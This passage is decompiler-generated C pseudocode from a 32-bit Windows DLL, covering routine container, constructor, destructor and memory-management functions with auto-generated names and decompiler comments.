  v12 = sub_10029C4A(a2[6], v17);
  LOBYTE(v18) = 1;
  LOBYTE(v11) = sub_1000D65C((int)v11, (int)v12) != 0;
  LOBYTE(v18) = 0;
  sub_1000D3AD(v17);
  v18 = -1;
  sub_1000D3AD(v16);
  if ( (_BYTE)v11 )
  {
    v13 = sub_10029C4A(a1[6], v17);
    v18 = 2;
    v14 = sub_10029C4A(a2[6], v16);
    LOBYTE(v18) = 3;
    v15 = sub_1000D64D((int)v13, (int)v14);
    LOBYTE(v18) = 2;
    sub_1000D3AD(v16);
    v18 = -1;
    sub_1000D3AD(v17);
    return v15;
  }
  else
  {
    return 0;
  }
}
// 10032967: using guessed type int var_18[5];

//----- (10032A76) --------------------------------------------------------
LONG *__cdecl sub_10032A76(LONG *a1, unsigned int a2)
{
  int v2; // ecx
  int v3; // edi
  bool v4; // zf
  _DWORD *v5; // eax
  __int64 v6; // rax
  _DWORD *v7; // edi
  _DWORD *v8; // eax
  int v10; // [esp+10h] [ebp-20h] BYREF
  LONG v11; // [esp+14h] [ebp-1Ch] BYREF
  _DWORD *v12; // [esp+18h] [ebp-18h] BYREF
  int v13; // [esp+1Ch] [ebp-14h]
  int v14; // [esp+2Ch] [ebp-4h]

  v3 = v2;
  v14 = 0;
  v13 = 0;
  v4 = *(_DWORD *)(v2 + 620) == 0;
  v12 = (_DWORD *)(v2 + 620);
  if ( v4 )
  {
    v5 = sub_1000E7F7(&v12, 1, 0);
    v14 = 1;
    sub_10007882((int)v5);
  }
  sub_100067D5(a1);
  v14 = 0;
  v13 = 1;
  sub_1000D17D(&v10, (wchar_t *)(v3 + 44));
  v14 = 2;
  sub_10001236(&v11, a1 + 1);
  LOBYTE(v14) = 0;
  sub_1000D3AD(&v10);
  a1[2] = *(_DWORD *)(v3 + 32);
  v6 = *(_QWORD *)(v3 + 20) / 10000i64;
  v7 = v12;
  *((_QWORD *)a1 + 2) = v6;
  sub_1003098B(a1 + 6, v7);
  if ( a2 < sub_1000D687((int)a1) )
  {
    v8 = sub_1000D836(a2, (int)a1, &v10, 0);
    v14 = 3;
    sub_10001236(v8 + 1, a1 + 1);
    LOBYTE(v14) = 0;
    sub_1000D3AD(&v10);
  }
  return a1;
}
// 10032A82: variable 'v2' is possibly undefined

//----- (10032B59) --------------------------------------------------------
int __usercall sub_10032B59@<eax>(int a1@<edi>)
{
  wchar_t *v1; // eax
  int v2; // esi
  int v4; // [esp-Ch] [ebp-80h]
  int v5; // [esp-8h] [ebp-7Ch]
  int v6; // [esp-4h] [ebp-78h]
  int v7[2]; // [esp+10h] [ebp-64h] BYREF
  void *v8[2]; // [esp+18h] [ebp-5Ch] BYREF
  _DWORD v9[4]; // [esp+20h] [ebp-54h] BYREF
  int v10[5]; // [esp+30h] [ebp-44h] BYREF
  LONG v11[2]; // [esp+44h] [ebp-30h] BYREF
  _DWORD ArgList[2]; // [esp+4Ch] [ebp-28h]
  int v13; // [esp+54h] [ebp-20h]
  int v14; // [esp+58h] [ebp-1Ch]
  int v15; // [esp+70h] [ebp-4h]

  sub_10032A76(v11, *(_DWORD *)(a1 + 112));
  v15 = 0;
  sub_1000D17D(v7, &word_101774BC);
  LOBYTE(v15) = 1;
  sub_1000B261((int)v11, (int)v10, 0);
  LOBYTE(v15) = 2;
  sub_10032E71(v9);
  LOBYTE(v15) = 3;
  sub_10034F16(v9, (int)v10);
  v6 = v14;
  v5 = v13;
  v4 = ArgList[0];
  v1 = (wchar_t *)sub_1000CC40((int)&unk_10177F08);
  sub_1000D6C3((int)v7, v1, v4, v5, v6);
  sub_1005083E((void *)(a1 + 84), (int *)v8, (unsigned __int8 *)v7, v9);
  LOBYTE(v15) = 4;
  if ( *((_BYTE *)v8[0] + 4) )
    v2 = 0;
  else
    v2 = sub_100500E2((int **)v8[0]);
  LOBYTE(v15) = 3;
  sub_1003406C(v8);
  LOBYTE(v15) = 2;
  sub_10032EA8(v9);
  LOBYTE(v15) = 1;
  sub_1000B3DF(v10);
  LOBYTE(v15) = 0;
  sub_1000D3AD(v7);
  v15 = -1;
  sub_1000646B(v11);
  return v2;
}
// 10032B59: using guessed type LONG var_30[2];
// 10032B59: using guessed type int var_44[5];
// 10032B59: using guessed type _DWORD var_54[4];
// 10032B59: using guessed type _DWORD ArgList[2];

//----- (10032C8B) --------------------------------------------------------
void __fastcall sub_10032C8B(int a1, int a2)
{
  wchar_t *v3; // eax
  int v4; // [esp-Ch] [ebp-78h]
  int v5; // [esp-8h] [ebp-74h]
  int v6; // [esp-4h] [ebp-70h]
  int v7[2]; // [esp+10h] [ebp-5Ch] BYREF
  _DWORD v8[4]; // [esp+18h] [ebp-54h] BYREF
  int v9[5]; // [esp+28h] [ebp-44h] BYREF
  LONG v10[2]; // [esp+3Ch] [ebp-30h] BYREF
  _DWORD ArgList[2]; // [esp+44h] [ebp-28h]
  int v12; // [esp+4Ch] [ebp-20h]
  int v13; // [esp+50h] [ebp-1Ch]
  int v14; // [esp+68h] [ebp-4h]

  sub_10032A76(v10, *(_DWORD *)(a2 + 112));
  v14 = 0;
  sub_1000D17D(v7, &word_10177794);
  LOBYTE(v14) = 1;
  sub_1000B261((int)v10, (int)v9, 0);
  LOBYTE(v14) = 2;
  sub_10032E71(v8);
  LOBYTE(v14) = 3;
  sub_10034F16(v8, (int)v9);
  v6 = v13;
  v5 = v12;
  v4 = ArgList[0];
  v3 = (wchar_t *)sub_1000CC40((int)&unk_10177FD8);
  sub_1000D6C3((int)v7, v3, v4, v5, v6);
  sub_10050743(a2 + 84, (unsigned __int8 *)v7, v8);
  LOBYTE(v14) = 2;
  sub_10032EA8(v8);
  LOBYTE(v14) = 1;
  sub_1000B3DF(v9);
  LOBYTE(v14) = 0;
  sub_1000D3AD(v7);
  v14 = -1;
  sub_1000646B(v10);
}
// 10032C8B: using guessed type LONG var_30[2];
// 10032C8B: using guessed type int var_44[5];
// 10032C8B: using guessed type _DWORD var_54[4];
// 10032C8B: using guessed type _DWORD ArgList[2];

//----- (10032D8F) --------------------------------------------------------
_DWORD *__thiscall sub_10032D8F(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  if ( v3 )
    v4 = sub_10033020(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10032E00) --------------------------------------------------------
_DWORD *__thiscall sub_10032E00(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x40u);
  if ( v3 )
    v4 = sub_100330DC(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10032E71) --------------------------------------------------------
_DWORD *__stdcall sub_10032E71(_DWORD *a1)
{
  sub_10032FFF(a1);
  *a1 = &off_10103548;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 10103548: using guessed type int (__thiscall *off_10103548)(void *Block, char);

//----- (10032EA8) --------------------------------------------------------
void __thiscall sub_10032EA8(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi

  *this = &off_10103548;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[5];
    sub_10032FD3(i);
  }
  sub_10039F05(this);
}
// 10103548: using guessed type int (__thiscall *off_10103548)(void *Block, char);

//----- (10032EFF) --------------------------------------------------------
_DWORD *__thiscall sub_10032EFF(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10103728;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103728: using guessed type int (__thiscall *off_10103728)(void *Block, char);

//----- (10032F5B) --------------------------------------------------------
_DWORD *__thiscall sub_10032F5B(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10103728;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103728: using guessed type int (__thiscall *off_10103728)(void *Block, char);

//----- (10032FB7) --------------------------------------------------------
_DWORD *__thiscall sub_10032FB7(_DWORD *Block, char a2)
{
  sub_10032EA8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10032FD3) --------------------------------------------------------
int *__stdcall sub_10032FD3(int *Block)
{
  sub_1000B3DF(Block);
  j__free(Block);
  return Block;
}

//----- (10032FFF) --------------------------------------------------------
_DWORD *__stdcall sub_10032FFF(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_100FBF5C;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);

//----- (10033020) --------------------------------------------------------
_DWORD *__stdcall sub_10033020(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_101036E8;
  a1[2] = &off_10104418;
  sub_1000D17D(a1 + 4, (wchar_t *)&word_10102960);
  a1[8] = 0;
  return a1;
}
// 101036E8: using guessed type int (__stdcall *off_101036E8)(char);
// 10104418: using guessed type int (__thiscall *off_10104418)(void *Block, char);

//----- (1003306E) --------------------------------------------------------
BOOL __thiscall sub_1003306E(int this)
{
  return *(_DWORD *)(this + 32) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1003308B) --------------------------------------------------------
LONG *__thiscall sub_1003308B(LONG *this)
{
  int v2; // eax
  LONG *v3; // eax

  v2 = (*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[8]);
  sub_10001236((LONG *)(v2 + 4), this + 5);
  v3 = (LONG *)(*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, this[8]);
  this[6] = *v3;
  this[7] = v3[1];
  return this + 2;
}

//----- (100330C5) --------------------------------------------------------
bool __thiscall sub_100330C5(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100330DC) --------------------------------------------------------
_DWORD *__stdcall sub_100330DC(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10103708;
  a1[2] = &off_10103648;
  sub_100067D5(a1 + 4);
  a1[14] = 0;
  return a1;
}
// 10103648: using guessed type int (__thiscall *off_10103648)(void *Block, char);
// 10103708: using guessed type int (__stdcall *off_10103708)(char);

//----- (10033124) --------------------------------------------------------
BOOL __thiscall sub_10033124(int this)
{
  return *(_DWORD *)(this + 56) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10033137) --------------------------------------------------------
BOOL __thiscall sub_10033137(_DWORD *this)
{
  return this[14] != 0;
}

//----- (10033141) --------------------------------------------------------
int __thiscall sub_10033141(int this)
{
  LONG *v2; // eax

  v2 = (LONG *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                 *(_DWORD *)(this + 4) + 4,
                 *(_DWORD *)(this + 56));
  sub_100333C9(v2, (LONG *)(this + 16));
  *(_BYTE *)(this + 48) = *(_BYTE *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                      *(_DWORD *)(this + 4) + 20,
                                      *(_DWORD *)(this + 56));
  return this + 8;
}

//----- (10033174) --------------------------------------------------------
void __thiscall sub_10033174(_DWORD *this)
{
  ++this[14];
}

//----- (10033178) --------------------------------------------------------
void __thiscall sub_10033178(_DWORD *this)
{
  --this[14];
}

//----- (1003317C) --------------------------------------------------------
void __thiscall sub_1003317C(int *this)
{
  *this = (int)&off_10103648;
  sub_1000646B(this + 2);
}
// 10103648: using guessed type int (__thiscall *off_10103648)(void *Block, char);

//----- (100331A3) --------------------------------------------------------
int __thiscall sub_100331A3(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 20);
  this[3] = result;
  return result;
}

//----- (100331DD) --------------------------------------------------------
int __thiscall sub_100331DD(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 24);
  this[2] = result;
  return result;
}

//----- (10033217) --------------------------------------------------------
int *__thiscall sub_10033217(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int *result; // eax
  _DWORD v9[4]; // [esp+10h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 20);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 20) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 24) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10032FD3(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10033296) --------------------------------------------------------
_DWORD *__thiscall sub_10033296(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[5]; // [esp-1Ch] [ebp-40h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  void *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x1Cu);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000B36F(a2, (int)v6);
    LOBYTE(v11) = 0;
    result = sub_10033388(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 20) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 24) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (1003331B) --------------------------------------------------------
int *__thiscall sub_1003331B(int *this, char a2)
{
  sub_1003317C(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1003334F) --------------------------------------------------------
int *__thiscall sub_1003334F(int *Block, char a2)
{
  sub_1003317C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10033388) --------------------------------------------------------
_DWORD *__stdcall sub_10033388(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  sub_1000B36F(&a2, (int)a1);
  a1[5] = a7;
  a1[6] = a8;
  sub_1000B3DF(&a2);
  return a1;
}

//----- (100333C9) --------------------------------------------------------
LONG *__usercall sub_100333C9@<eax>(LONG *a1@<eax>, LONG *a2@<esi>)
{
  sub_10001236(a1 + 1, a2 + 1);
  a2[2] = a1[2];
  a2[4] = a1[4];
  a2[5] = a1[5];
  sub_1003098B(a2 + 6, a1 + 6);
  return a2;
}

//----- (100333F8) --------------------------------------------------------
void __thiscall sub_100333F8(int this)
{
  *(_DWORD *)this = &off_101035C8;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 101035C8: using guessed type int (__thiscall *off_101035C8)(void *Block, char);

//----- (10033447) --------------------------------------------------------
int __thiscall sub_10033447(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  _DWORD *v7; // ecx
  int result; // eax
  int v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10136FE6);
  v4 = *this;
  v9 = *a2;
  v10 = a2[1];
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
  {
    v7 = (_DWORD *)(this[3] + 8 * i);
    *v7 = *(v7 - 2);
    v7[1] = *(v7 - 1);
  }
  result = this[3];
  *(_DWORD *)(result + 8 * a3) = v9;
  *(_DWORD *)(result + 8 * a3 + 4) = v10;
  ++this[1];
  return result;
}

//----- (100334BF) --------------------------------------------------------
int __thiscall sub_100334BF(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi
  _DWORD *v4; // eax
  int v5; // eax
  int v6; // ecx

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10136FE7);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (_DWORD *)(this[3] + 8 * v2);
    *v4 = v4[2];
    v4[1] = v4[3];
    ++v2;
  }
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  v6 = this[3];
  *(_DWORD *)(v6 + 8 * v5) = 0;
  *(_DWORD *)(v6 + 8 * v5 + 4) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10033513) --------------------------------------------------------
int __thiscall sub_10033513(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10137066);
  return this[3] + 8 * a2;
}

//----- (10033531) --------------------------------------------------------
int __thiscall sub_10033531(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10137067);
  return this[3] + 8 * a2;
}

//----- (1003354F) --------------------------------------------------------
int __thiscall sub_1003354F(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax
  int v5; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
  {
    v4 = this[3];
    *(_DWORD *)(v4 + 8 * i) = 0;
    *(_DWORD *)(v4 + 8 * i + 4) = 0;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v5 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (10033593) --------------------------------------------------------
unsigned int __thiscall sub_10033593(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101370B6);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10033605) --------------------------------------------------------
void __thiscall sub_10033605(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(8 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        v7[1] = *(_DWORD *)((char *)v7 + v8 + 4);
        v7 += 2;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}

//----- (100336C2) --------------------------------------------------------
_DWORD *__stdcall sub_100336C2(_DWORD *a1)
{
  unsigned int i; // eax

  *a1 = off_100FBF5C;
  *a1 = &off_1010358C;
  sub_10018FD5(a1 + 1, 0x10u);
  a1[5] = off_100FBF5C;
  a1[5] = &off_101035C8;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  a1[6] = 0;
  a1[7] = i;
  a1[8] = operator new(8 * i);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 1010358C: using guessed type int (__thiscall *off_1010358C)(void *Block, char);
// 101035C8: using guessed type int (__thiscall *off_101035C8)(void *Block, char);

//----- (1003373D) --------------------------------------------------------
void __thiscall sub_1003373D(_DWORD *this)
{
  *this = &off_1010358C;
  sub_100333F8((int)(this + 5));
  sub_100068A5(this + 1);
  sub_10039F05(this);
}
// 1010358C: using guessed type int (__thiscall *off_1010358C)(void *Block, char);

//----- (10033780) --------------------------------------------------------
bool __thiscall sub_10033780(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  bool result; // al

  v3 = sub_1001901E(this, a2);
  result = 0;
  if ( v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
    if ( !sub_1000D65C(a2, v4) )
      return 1;
  }
  return result;
}

//----- (100337BD) --------------------------------------------------------
int __thiscall sub_100337BD(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v6[2]; // [esp+8h] [ebp-8h] BYREF

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    v6[0] = 0;
    v6[1] = 0;
    (*(void (__thiscall **)(_DWORD *, int *, int))(this[5] + 32))(this + 5, v6, v3);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (10033822) --------------------------------------------------------
_DWORD *__thiscall sub_10033822(void *this, int a2, int *a3)
{
  int v3; // esi
  int v4; // edi
  _DWORD *result; // eax

  v3 = *a3;
  v4 = a3[1];
  result = (_DWORD *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  result[1] = v4;
  *result = v3;
  return result;
}

//----- (10033840) --------------------------------------------------------
_DWORD *__thiscall sub_10033840(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_101035C8;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1003EBB6(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101035C8: using guessed type int (__thiscall *off_101035C8)(void *Block, char);

//----- (1003389A) --------------------------------------------------------
int *__thiscall sub_1003389A(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10007ECD(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (100338DC) --------------------------------------------------------
void __thiscall sub_100338DC(_DWORD *this)
{
  char *v2; // eax

  *this = &off_10103650;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10007ECD(v2);
  this[3] = 0;
  sub_10039F05(this);
}
// 10103650: using guessed type int (__thiscall *off_10103650)(void *Block, char);

//----- (1003392E) --------------------------------------------------------
void __thiscall sub_1003392E(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // esi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // edi
  LONG v8[10]; // [esp+10h] [ebp-2Ch] BYREF
  int v9; // [esp+38h] [ebp-4h]
  int v10; // [esp+44h] [ebp+8h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_101370B7);
  sub_100322DB(a2, v8);
  v9 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v6 > a3 )
  {
    v7 = 32 * v6;
    v10 = v6 - a3;
    do
    {
      sub_100333C9((LONG *)(this[3] + v7 - 32), (LONG *)(this[3] + v7));
      v7 -= 32;
      --v10;
    }
    while ( v10 );
  }
  sub_100333C9(v8, (LONG *)(this[3] + 32 * a3));
  ++this[1];
  v9 = -1;
  sub_1000646B(v8);
}
// 1003392E: using guessed type LONG var_2C[10];

//----- (100339C8) --------------------------------------------------------
int __thiscall sub_100339C8(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebp
  int v5; // ebx
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101370F6);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 32 * a2;
    do
    {
      sub_100333C9((LONG *)(this[3] + v5 + 32), (LONG *)(this[3] + v5));
      ++v4;
      v5 += 32;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_100333C9(dword_10193B98, (LONG *)(this[3] + 32 * v6));
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193B98: using guessed type LONG dword_10193B98[8];

//----- (10033A36) --------------------------------------------------------
int __thiscall sub_10033A36(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101370F7);
  return this[3] + 32 * a2;
}

//----- (10033A55) --------------------------------------------------------
int __thiscall sub_10033A55(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013713A);
  return this[3] + 32 * a2;
}

//----- (10033A74) --------------------------------------------------------
char *__thiscall sub_10033A74(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
